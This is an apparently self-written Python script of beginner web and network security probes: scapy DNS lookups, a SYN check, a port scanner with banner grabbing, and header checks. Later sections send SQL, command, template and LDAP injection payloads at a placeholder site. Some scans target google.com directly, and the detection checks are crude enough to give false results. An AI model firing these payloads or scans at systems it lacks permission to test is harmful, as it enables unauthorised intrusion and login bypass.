from scapy.layers.inet import IP, UDP, TCP
from scapy.layers.dns import DNS, DNSQR
from scapy.sendrecv import sr1, sr
import socket
import requests
from bs4 import BeautifulSoup
import hashlib

# Query your company's domain
packet = IP(dst="8.8.8.8") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="google.com"))
response = sr1(packet, timeout=3)

if response and response.haslayer(DNS):
    print("=== DNS Response for google.com ===")
    response[DNS].show()

    # Extract just the IP addresses
    if response[DNS].an:
        print("\nIP Addresses found:")
        for answer in response[DNS].an:
            if answer.type == 1:  # A record (IPv4)
                print(f"  {answer.rdata}")
    else:
        print("No IP addresses found in DNS response")
else:
    print("No response received")

######################################################################
domain = "yourwebsite.com"

print(f"Quick scan for {domain}")

# Get IP address
packet = IP(dst="8.8.8.8") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain))
response = sr1(packet, timeout=3, verbose=0)

if response and response.haslayer(DNS) and response[DNS].an:
    ip = response[DNS].an[0].rdata
    print(f"IP Address: {ip}")

    # Check if website is alive
    web_packet = IP(dst=ip) / TCP(dport=80, flags="S")
    web_response = sr1(web_packet, timeout=2, verbose=0)

    if web_response and web_response.haslayer(TCP) and web_response[TCP].flags == 0x12:
        print("Website is ONLINE (HTTP port 80 open)")
        sr1(IP(dst=ip) / TCP(dport=80, flags="R"), timeout=1, verbose=0)
    else:
        print("Website appears OFFLINE (HTTP port 80 closed)")
else:
    print("Could not find domain")

######################################################################
# Simple port scanner using sockets 

def port_scanner(domain):
    common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 993, 995]

    print(f" Scanning {domain} with just sockets...")

    for port in common_ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)

        result = sock.connect_ex((domain, port))
        if result == 0:
            print(f" Port {port}: OPEN")

            # Try to get service banner
            try:
                sock.settimeout(2)
                banner = sock.recv(1024).decode('utf-8', errors='ignore')
                if banner:
                    print(f"  Banner: {banner.strip()[:100]}...")
            except:
                pass
        else:
            print(f" Port {port}: CLOSED")

        sock.close()


port_scanner("google.com")
##############################################

# Quick BeautifulSoup scan to check if website is alive and get basic info

url = "https://yourwebsite.com"

print(f"Quick BeautifulSoup Scan for {url}")

try:
    response = requests.get(url, timeout=10, verify=False)
    soup = BeautifulSoup(response.text, 'html.parser')

    print("Website loaded successfully!")
    print(f"Title: {soup.title.string if soup.title else 'No title'}")
    print(f"Links: {len(soup.find_all('a'))}")
    print(f"Forms: {len(soup.find_all('form'))}")
    print(f"Scripts: {len(soup.find_all('script'))}")
    print(f"Images: {len(soup.find_all('img'))}")

    # Show first 5 links
    print("\nFirst 5 links:")
    for i, link in enumerate(soup.find_all('a')[:5]):
        href = link.get('href', 'No href')
        text = link.get_text(strip=True)[:30]
        print(f"  {i + 1}. {text} -> {href}")

except Exception as e:
    print(f"Error: {e}")

#############################################################################
# Quick check if website is alive and if it redirects

domain = "yourwebsite.com"

print(f"Quick website check for {domain}")

try:
    # Try to access the website
    response = requests.get(f"https://{domain}", timeout=10, verify=False)

    print(f"Website is LIVE!")
    print(f"Status Code: {response.status_code}")
    print(f"Server: {response.headers.get('Server', 'Unknown')}")
    print(f"Title: {response.text[:100]}...")  # First 100 chars

    # Check if it's redirecting
    if response.history:
        print(f"Redirects through: {len(response.history)} steps")
        for resp in response.history:
            print(f"    -> {resp.status_code}: {resp.url}")
    else:
        print("No redirects detected")
except requests.exceptions.SSLError:
    print("SSL Certificate issue - trying HTTP...")
    try:
        response = requests.get(f"http://{domain}", timeout=10)
        print(f"Website works on HTTP (no HTTPS)")
        print(f"Status: {response.status_code}")
    except:
        print("HTTP also failed")

except requests.exceptions.ConnectionError:
    print("Cannot connect to website")

except requests.exceptions.Timeout:
    print("Connection timeout")

except Exception as e:
    print(f"Error: {e}")


######################################################################

# Ultra simple SQLi test - just check for common payloads and look for SQL error messages in the response

target = "yourwebsite.com"
url = f"https://{target}"

print(f"Ultra Simple SQLi Test for {target}")

# Just test the most common payloads
payloads = ["'", "' OR '1'='1", "admin'--", "' UNION SELECT 1--"]

for payload in payloads:
    try:
        test_url = f"{url}/?test={payload}"
        response = requests.get(test_url, timeout=5, verify=False)

        # Check for SQL errors
        if any(error in response.text.lower() for error in ['sql', 'mysql', 'error', 'syntax']):
            print(f"POSSIBLE SQLi: {payload}")
        else:
            print(f"Clean: {payload}")

    except:
        print(f"Failed: {payload}")


################################################################
# Quick security check - look for security headers and content fingerprint


url = "https://yourwebsite.com"

print(f"Quick Security Check for {url}")

try:
    response = requests.get(url, timeout=10, verify=False)

    # Content fingerprint
    content_hash = hashlib.sha256(response.text.encode()).hexdigest()
    
    print(f"Content Fingerprint: {content_hash}")

    # Security headers check
    security_headers = ['Content-Security-Policy', 'Strict-Transport-Security',
                          'X-Content-Type-Options', 'X-Frame-Options']
    print("Security Headers:")
    for header in security_headers:
        if header in response.headers:
            print(f"  OK: {header}")
        else:
            print(f"  MISSING: {header}")

    # Check for common vulnerabilities
    if '<script>' in response.text and 'Content-Security-Policy' not in response.headers:
        print("WARNING: Scripts found but no CSP header!")
    print("Quick scan complete!")

except Exception as e: 
    print(f"Error: {e}")

########################################################################
# Quick code injection test - just check for common payloads and look for command execution indicators in the response

target = "yourwebsite.com"
url = f"https://{target}"

print(f" Quick Code Injection Test for {target}")

# Most dangerous code injection payloads
payloads = [
    ";ls -la",
    "| whoami",
    "&& id",
    "<?php system('id'); ?>",
    "{{7*7}}",
    "${1+1}",
    "__import__('os').system('id')"
]

for payload in payloads:
    try:
        test_url = f"{url}/search?q={payload}"
        response = requests.get(test_url, timeout=5, verify=False)

        # Check for command execution indicators
        if any(indicator in response.text for indicator in ['root', 'admin', '49', '2', 'Linux']):
            print(f"POSSIBLE CODE INJECTION: {payload}")
        else:
            print(f"Clean: {payload}")

    except Exception as e:
        print(f"Error: {payload}")

print("Quick code injection test complete!")


#########################################################################
# Quick LDAP injection test
target = "yourwebsite.com"
url = f"https://{target}/login"

print(f" Quick LDAP Injection Test for {target}")

# Most common LDAP injection payloads
ldap_payloads = [
    {"username": "*", "password": "*"},
    {"username": "admin*", "password": "*"},
    {"username": "*)(uid=*))(|(uid=*", "password": "*"},
    {"username": "admin", "password": "*"},
    {"username": "*)(objectClass=*", "password": "*"}
]

for payload in ldap_payloads:
    try:
        response = requests.post(url, data=payload, timeout=5, verify=False, allow_redirects=False)

        # Check for successful login indicators
        if response.status_code in [302, 303]:
            print(f" POSSIBLE LDAP BYPASS: {payload}")
        elif "dashboard" in response.text.lower() or "welcome" in response.text.lower():
            print(f" POSSIBLE LDAP BYPASS: {payload}")
        else:
            print(f" Blocked: {payload}")

    except Exception as e:
        print(f"Error: {payload}\n{e}")

print("Quick LDAP test complete!")
input("Execution finished. Press Enter to exit...")